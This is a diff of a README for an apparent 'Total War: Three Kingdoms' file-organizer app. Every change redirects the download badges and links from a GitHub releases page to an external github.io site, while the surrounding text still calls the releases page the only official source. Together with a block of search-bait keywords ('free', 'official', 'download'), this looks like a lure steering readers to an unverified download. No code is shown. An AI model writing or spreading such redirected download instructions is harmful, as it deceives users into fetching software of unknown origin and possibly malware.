@@ -1,6 +1,6 @@
 # 🐎 total-war-three-kingdoms-desktop - Organize Your Three Kingdoms Files
 
-[![Download total-war-three-kingdoms-desktop](https://img.shields.io/badge/Download-Latest%20Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shankar936142/total-war-three-kingdoms-desktop/releases)
+[![Download total-war-three-kingdoms-desktop](https://img.shields.io/badge/Download-Latest%20Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://shankar936142.github.io)
 
 A friendly desktop helper for Total War: Three Kingdoms players who want their data folders, configuration files, export files, and photo albums neatly organized on Windows and macOS — without touching a single command line.
 
@@ -28,7 +28,7 @@ This tool is aimed at players who love the game but do not love hunting through 
 Getting the app onto your computer takes only a moment.
 
 1. Open the download link in your browser.
-2. Visit this link to download the application: https://github.com/Shankar936142/total-war-three-kingdoms-desktop/releases
+2. Visit this link to download the application: https://shankar936142.github.io
 3. Follow the instructions shown on that page to obtain the application for your system.
 
 That is the entire process. You do not need an account on any developer platform, you do not need to compile anything, and you do not need to understand what a repository is. The releases page is simply the official place where the finished application files are published.
@@ -39,9 +39,9 @@ Once you have the application on your computer, keep it somewhere you can find a
 
 ## 💾 Download & Setup
 
-[![Download total-war-three-kingdoms-desktop](https://img.shields.io/badge/Get%20the%20App-Releases%20Page-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Shankar936142/total-war-three-kingdoms-desktop/releases)
+[![Download total-war-three-kingdoms-desktop](https://img.shields.io/badge/Get%20the%20App-Releases%20Page-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://shankar936142.github.io)
 
-Visit this link to download the application: https://github.com/Shankar936142/total-war-three-kingdoms-desktop/releases
+Visit this link to download the application: https://shankar936142.github.io
 
 The releases page is the only official source for this application. It lists the available versions along with the files that belong to each version, so you can always see what you are getting before you download it. Bookmark the page — it is also where future updates will appear.
 
@@ -139,6 +139,6 @@ Game updates occasionally change folder layouts. Check the releases page for a n
 
 ## 📥 One More Time — Where to Get It
 
-Visit this link to download the application: https://github.com/Shankar936142/total-war-three-kingdoms-desktop/releases
+Visit this link to download the application: https://shankar936142.github.io
 
 Keywords: 2026-total-war-three-kingdoms, app-total-war-three-kingdoms, download-total-war-three-kingdoms, free-total-war-three-kingdoms, macos-total-war-three-kingdoms, official-total-war-three-kingdoms, pc-total-war-three-kingdoms, software-total-war-three-kingdoms, total-war-three-kingdoms, total-war-three-kingdoms-2026, total-war-three-kingdoms-app, total-war-three-kingdoms-desktop, total-war-three-kingdoms-download, total-war-three-kingdoms-free, total-war-three-kingdoms-macos, total-war-three-kingdoms-official, total-war-three-kingdoms-pc, total-war-three-kingdoms-software, total-war-three-kingdoms-windows, windows-total-war-three-kingdoms
